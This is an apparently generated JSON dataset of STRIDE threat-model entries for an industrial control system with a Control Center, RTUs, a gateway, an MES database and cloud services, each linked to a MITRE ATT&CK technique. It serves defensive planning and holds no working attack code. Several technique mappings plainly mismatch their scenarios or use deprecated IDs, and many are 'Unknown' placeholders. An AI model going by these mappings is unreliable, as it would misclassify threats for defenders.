                    "Assumption": "Firmware or software is outdated.",
                    "Role": "System Admin",
                    "Condition": "Failure to apply vendor updates."
                },
                {
                    "Assumption": "Remote access protocols are insecure.",
                    "Role": "Network Admin",
                    "Condition": "Insecure remote management interfaces."
                },
                {
                    "Assumption": "Logging and monitoring are not enforced.",
                    "Role": "IT Security Staff",
                    "Condition": "Lack of real-time logging and monitoring."
                }
            ],
            "Potential Impact": "Gateway control, interception, and manipulation of all data flows.",
            "MITRE ATT&CK Keywords": [
                "root access",
                "gateway",
                "exploitation",
                "elevation"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a misconfigured cloud IAM to escalate privileges.",
            "Assumptions": [
                {
                    "Assumption": "IAM settings are overly permissive.",
                    "Role": "Cloud Admin",
                    "Condition": "Lack of principle of least privilege."
                },
                {
                    "Assumption": "IAM misconfigurations are not audited.",
                    "Role": "IT Security Team",
                    "Condition": "Lack of regular IAM audits."
                },
                {
                    "Assumption": "No role separation or differentiation in cloud services.",
                    "Role": "Cloud Architect",
                    "Condition": "Single role with broad access."
                }
            ],
            "Potential Impact": "Extended access to cloud resources, potential full data compromise.",
            "MITRE ATT&CK Keywords": [
                "IAM misconfiguration",
                "cloud",
                "privilege escalation",
                "access"
            ],
            "mitre_technique": {
                "name": "Revert Cloud Instance",
                "description": "An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.\n\nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)",
                "id": "attack-pattern--0708ae90-d0eb-4938-9a76-d0fc94f6eec1",
                "technique_id": "T1578.004"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "14",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains unauthorized access to the Control Center by spoofing the credentials of an operator.",
            "Assumptions": [
                {
                    "Assumption": "Operator credentials are not secured with strong authentication methods.",
                    "Role": "System Administrator",
                    "Condition": "Credentials are reused or weak."
                },
                {
                    "Assumption": "Network security does not fully prevent unauthorized access.",
                    "Role": "Network Security Team",
                    "Condition": "Inadequate intrusion detection and prevention."
                },
                {
                    "Assumption": "Monitoring systems are not set up to quickly detect unauthorized access.",
                    "Role": "IT Security Team",
                    "Condition": "Lack of effective monitoring and alerting."
                }
            ],
            "Potential Impact": "Leads to unauthorized access to sensitive data, which can be used to manipulate control commands and disrupt production.",
            "MITRE ATT&CK Keywords": [
                "Unauthorized Access",
                "Credentials Spoofing",
                "Control Center"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker mimics a legitimate field device to send false sensor data to the RTUs via the gateway.",
            "Assumptions": [
                {
                    "Assumption": "Field devices are not authenticated before data is accepted.",
                    "Role": "System Designer",
                    "Condition": "Lack of device authentication mechanisms."
                },
                {
                    "Assumption": "Communications are not encrypted or secure.",
                    "Role": "Network Security Team",
                    "Condition": "Unsecured data transmissions."
                },
                {
                    "Assumption": "Real-time data integrity checks are not in place.",
                    "Role": "System Architect",
                    "Condition": "No robust validation techniques for incoming data."
                }
            ],
            "Potential Impact": "False data could lead to incorrect operational decisions, compromising system integrity and disrupting industrial processes.",
            "MITRE ATT&CK Keywords": [
                "Device Impersonation",
                "Data Injection",
                "Sensor Spoofing"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a cloud service endpoint to intercept data sent from the gateway.",
            "Assumptions": [
                {
                    "Assumption": "Endpoints are not properly authenticated.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Endpoint security policies are weak or non-existent."
                },
                {
                    "Assumption": "Gateway validation of endpoints is insufficient.",
                    "Role": "System Developer",
                    "Condition": "No endpoint verification processes."
                },
                {
                    "Assumption": "Data transmissions rely on insecure communication protocols.",
                    "Role": "Network Administrator",
                    "Condition": "Use of unencrypted or poorly secured protocols."
                }
            ],
            "Potential Impact": "Sensitive operational data can be intercepted and exploited, leading to confidentiality breaches and potential tampering.",
            "MITRE ATT&CK Keywords": [
                "Network Eavesdropping",
                "Endpoint Spoofing",
                "Data Interception"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious changes are made to configuration files on the Control Center systems.",
            "Assumptions": [
                {
                    "Assumption": "Configuration files are not properly secured.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate file protection mechanisms."
                },
                {
                    "Assumption": "Access controls are insufficient.",
                    "Role": "IT Security Team",
                    "Condition": "Weak or lacking access restrictions for critical files."
                },
                {
                    "Assumption": "Change monitoring is ineffective.",
                    "Role": "Compliance Team",
                    "Condition": "Lack of real-time monitoring and logging of configuration changes."
                }
            ],
            "Potential Impact": "This could lead to unauthorized changes in how the system operates, impacting data integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "Configuration Tampering",
                "System Modification",
                "File Manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters data being sent from field devices to RTUs, undermining the integrity of reported data.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not protected by encryption.",
                    "Role": "Network Security Team",
                    "Condition": "Unsecured transmission protocols are used."
                },
                {
                    "Assumption": "Integrity checks on incoming data are not enabled.",
                    "Role": "System Designer",
                    "Condition": "Lack of data validation rules."
                },
                {
                    "Assumption": "Field devices are physically accessible.",
                    "Role": "Facility Manager",
                    "Condition": "Insufficient physical security controls."
                }
            ],
            "Potential Impact": "Falsified data can lead to incorrect actions being taken by the Control Center, affecting production and operational integrity.",
            "MITRE ATT&CK Keywords": [
                "Data Manipulation",
                "Data Tampering",
                "Communication Interference"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Compromise of the gateway allows an attacker to modify data before sending it to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Gateway security is not rigorous.",
                    "Role": "System Architect",
                    "Condition": "Lack of security hardening and patching."
                },
                {
                    "Assumption": "Unauthorized access detection is weak.",
                    "Role": "IT Security Team",
                    "Condition": "Inadequate monitoring and alerting."
                },
                {
                    "Assumption": "No redundancy mechanisms for validation.",
                    "Role": "System Designer",
                    "Condition": "Single points of failure without checks."
                }
            ],
            "Potential Impact": "Data integrity is compromised, potentially leading to unauthorized control commands and misinformed decision-making in cloud analytics.",
            "MITRE ATT&CK Keywords": [
                "Gateway Compromise",
                "Data Modification",
                "Intermediary Tampering"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker performs actions within the Control Center and denies responsibility, leading to difficulties in establishing accountability.",
            "Assumptions": [
                {
                    "Assumption": "Lack of detailed activity logs.",
                    "Role": "System Administrator",
                    "Condition": "No comprehensive audit trails."
                },
                {
                    "Assumption": "Weak user authentication mechanisms.",
                    "Role": "IT Security Team",
                    "Condition": "Inadequate user authentication processes."
                },
                {
                    "Assumption": "No multi-factor authentication in place.",
                    "Role": "Security Architect",
                    "Condition": "Single-factor authentication used."
                }
            ],
            "Potential Impact": "Difficulties in tracing back actions to specific users, compromising transparency and accountability, and hindering forensic investigations.",
            "MITRE ATT&CK Keywords": [
                "Action Denial",
                "Logging Evasion",
                "User Impersonation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Unauthorized changes to the MES database are made, which cannot be traced back to a specific user.",
            "Assumptions": [
                {
                    "Assumption": "Audit logs are not properly maintained.",
                    "Role": "Database Administrator",
                    "Condition": "Logs are missing or tampered with."
                },
                {
                    "Assumption": "User actions are not monitored.",
                    "Role": "Compliance Officer",
                    "Condition": "Lack of user activity monitoring."
                },
                {
                    "Assumption": "Weak access controls to the database.",
                    "Role": "IT Security Team",
                    "Condition": "Inadequate permission management."
                }
            ],
            "Potential Impact": "Leads to difficulties in identifying the perpetrators of changes, impacting data integrity and the accountability of MES operations.",
            "MITRE ATT&CK Keywords": [
                "Database Activity Evasion",
                "Audit Log Evasion",
                "Data Manipulation"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker uses stolen credentials to perform unauthorized actions on the cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Credentials are not regularly rotated.",
                    "Role": "System Administrator",
                    "Condition": "Static credentials are used."
                },
                {
                    "Assumption": "Detection mechanisms for credential misuse are inadequate.",
                    "Role": "IT Security Team",
                    "Condition": "Lack of real-time credential monitoring."
                },
                {
                    "Assumption": "Authentication logs are not scrutinized.",
                    "Role": "IT Compliance Team",
                    "Condition": "Infrequent log review."
                }
            ],
            "Potential Impact": "Unauthorized actions are performed without accountability, potentially leading to data breaches and integrity issues.",
            "MITRE ATT&CK Keywords": [
                "Credential Use",
                "Log Manipulation",
                "Unauthorized Access"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts sensitive data transmitted between the gateway and cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not encrypted.",
                    "Role": "Network Security Team",
                    "Condition": "Use of non-encrypted communication protocols."
                },
                {
                    "Assumption": "Endpoints are poorly secured.",
                    "Role": "System Architect",
                    "Condition": "Weak endpoint security configurations."
                },
                {
                    "Assumption": "Network segmentation is weak.",
                    "Role": "Network Administrator",
                    "Condition": "Inadequate network segmentation."
                }
            ],
            "Potential Impact": "Leads to unauthorized access to sensitive operational data, violating confidentiality and possibly aiding further attacks.",
            "MITRE ATT&CK Keywords": [
                "Data Interception",
                "Man-in-the-Middle",
                "Network Eavesdropping"
            ],
            "mitre_technique": {
                "name": "Manipulation of Control",
                "description": "Adversaries may manipulate physical process control within the industrial environment. Methods of manipulating control can include changes to set point values, tags, or other parameters. Adversaries may manipulate control systems devices or possibly leverage their own, to communicate with and command physical control processes. The duration of manipulation may be temporary or longer sustained, depending on operator detection.   \n\nMethods of Manipulation of Control include: \n\n* Man-in-the-middle  \n* Spoof command message \n* Changing setpoints  \n\nA Polish student used a remote controller device to interface with the Lodz city tram system in Poland. (Citation: John Bill May 2017) (Citation: Shelley Smith February 2008) (Citation: Bruce Schneier January 2008) Using this remote, the student was able to capture and replay legitimate tram signals. As a consequence, four trams were derailed and twelve people injured due to resulting emergency stops. (Citation: Shelley Smith February 2008) The track controlling commands issued may have also resulted in tram collisions, a further risk to those on board and nearby the areas of impact. (Citation: Bruce Schneier January 2008)",
                "id": "attack-pattern--1af9e3fd-2bcc-414d-adbd-fe3b95c02ca1",
                "technique_id": "T0831"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data from MES database is accessed by unauthorized users due to poor access controls.",
            "Assumptions": [
                {
                    "Assumption": "Access control mechanisms are insufficient.",
                    "Role": "Database Administrator",
                    "Condition": "Lack of role-based access controls."
                },
                {
                    "Assumption": "Data encryption at rest is not implemented.",
                    "Role": "System Architect",
                    "Condition": "Unencrypted databases."
                },
                {
                    "Assumption": "Monitoring of database access is weak.",
                    "Role": "IT Security Team",
                    "Condition": "Lack of real-time monitoring and alerting."
                }
            ],
            "Potential Impact": "Leads to data breaches, violating confidentiality and potentially impacting business operations and compliance.",
            "MITRE ATT&CK Keywords": [
                "Unauthorized Access",
                "Access Control Bypass",
                "Data Theft"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the cloud service to access sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have unpatched vulnerabilities.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Delayed or incomplete patch management."
                },
                {
                    "Assumption": "Security scans are not regularly conducted.",
                    "Role": "IT Security Team",
                    "Condition": "Infrequent security assessments."
                },
                {
                    "Assumption": "Weak access controls in cloud storage.",
                    "Role": "System Administrator",
                    "Condition": "Improperly configured access settings."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data stored in the cloud, leading to potential data breaches and integrity concerns.",
            "MITRE ATT&CK Keywords": [
                "Vulnerability Exploitation",
                "Cloud Compromise",
                "Data Exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the Control Center network with traffic, disrupting communication with RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Network is not properly segmented.",
                    "Role": "Network Administrator",
                    "Condition": "Flat network architecture."
                },
                {
                    "Assumption": "DDoS protection mechanisms are lacking.",
                    "Role": "IT Security Team",
                    "Condition": "No traffic filtering or rate limiting in place."
                },
                {
                    "Assumption": "Backup communication channels are not in place.",
                    "Role": "System Architect",
                    "Condition": "Single communication path."
                }
            ],
            "Potential Impact": "Network disruptions can lead to a breakdown in command transmission and monitoring, impacting system availability.",
            "MITRE ATT&CK Keywords": [
                "DDoS Attack",
                "Network Flooding",
                "Traffic Saturation"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A botnet attack targeting field devices overwhelms their processing capabilities, causing them to malfunction.",
            "Assumptions": [
                {
                    "Assumption": "Field devices lack resource management controls.",
                    "Role": "Device Manufacturer",
                    "Condition": "Insufficient processing and memory management."
                },
                {
                    "Assumption": "No rate limiting on device communication.",
                    "Role": "System Designer",
                    "Condition": "Unrestricted data communication of devices."
                },
                {
                    "Assumption": "Field devices are exposed to the internet.",
                    "Role": "Facility Manager",
                    "Condition": "Direct internet access for field devices."
                }
            ],
            "Potential Impact": "Disruption in the functioning of field devices, causing potential downtime and loss of process control capabilities.",
            "MITRE ATT&CK Keywords": [
                "Botnet",
                "Device Overload",
                "Resource Exhaustion"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overloads cloud services with requests, leading to service degradation or unavailability.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service scaling is not robust.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Inadequate scaling policies."
                },
                {
                    "Assumption": "Rate limiting on cloud endpoints is weak.",
                    "Role": "System Administrator",
                    "Condition": "No rate limiting in API endpoints."
                },
                {
                    "Assumption": "No redundancy for cloud services.",
                    "Role": "System Architect",
                    "Condition": "Single points of failure without redundancy."
                }
            ],
            "Potential Impact": "Degradation or unavailability of cloud-based data processing and analytics, impacting data-driven decisions.",
            "MITRE ATT&CK Keywords": [
                "Cloud Overload",
                "Service Degradation",
                "API Abuse"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the Control Center software to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "Software vulnerabilities are unpatched.",
                    "Role": "System Administrator",
                    "Condition": "Delayed or neglected patching routines."
                },
                {
                    "Assumption": "No regular vulnerability assessments are conducted.",
                    "Role": "IT Security Team",
                    "Condition": "Infrequent security assessments and scans."
                },
                {
                    "Assumption": "Access controls do not follow the principle of least privilege.",
                    "Role": "Compliance Officer",
                    "Condition": "Inadequate access restrictions."
                }
            ],
            "Potential Impact": "Gaining administrative privileges allows attackers to make changes across the system, impacting confidentiality, integrity, and availability.",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Software Exploitation",
                "Administrative Access"
            ],
            "mitre_technique": {
                "name": "Service Registry Permissions Weakness",
                "description": "Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017)",
                "id": "attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427",
                "technique_id": "T1058"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker compromises a low-privileged cloud account to escalate privileges and gain access to sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud account privileges are misconfigured.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Improper privilege configurations."
                },
                {
                    "Assumption": "Identity and access management is weak.",
                    "Role": "System Administrator",
                    "Condition": "Lack of effective IAM policies."
                },
                {
                    "Assumption": "Multi-factor authentication is not enforced.",
                    "Role": "IT Security Team",
                    "Condition": "Single-factor authentication in use."
                }
            ],
            "Potential Impact": "Access to sensitive operational data and the ability to conduct high-impact actions, thereby compromising the system's integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "Cloud Privilege Escalation",
                "IAM Abuse",
                "Sensitive Data Access"
            ],
            "mitre_technique": {
                "name": "Temporary Elevated Cloud Access",
                "description": "Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. \n\nJust-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.(Citation: Azure Just in Time Access 2023)\n\nAccount impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts.(Citation: Google Cloud Service Account Authentication Roles)(Citation: Hunters Domain Wide Delegation Google Workspace 2023)(Citation: Google Cloud Just in Time Access 2023)(Citation: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts.(Citation: Microsoft Impersonation and EWS in Exchange) \n\nMany cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.(Citation: AWS PassRole)(Citation: Google Cloud Service Account Authentication Roles)\n\nWhile users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.(Citation: Rhino Google Cloud Privilege Escalation)(Citation: Rhino Security Labs AWS Privilege Escalation)\n\n**Note:** this technique is distinct from [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003), which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.(Citation: CrowdStrike StellarParticle January 2022)",
                "id": "attack-pattern--6fa224c7-5091-4595-bf15-3fc9fe2f2c7c",
                "technique_id": "T1548.005"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker manipulates firmware on field devices to gain more control over industrial processes.",
            "Assumptions": [
                {
                    "Assumption": "Field device firmware lacks integrity checks.",
                    "Role": "Device Manufacturer",
                    "Condition": "No verification for firmware updates."
                },
                {
                    "Assumption": "Firmware updates are not securely distributed.",
                    "Role": "System Administrator",
                    "Condition": "No encryption or signing of firmware updates."
                },
                {
                    "Assumption": "Insufficient physical security.",
                    "Role": "Facility Manager",
                    "Condition": "Easy physical access to devices."
                }
            ],
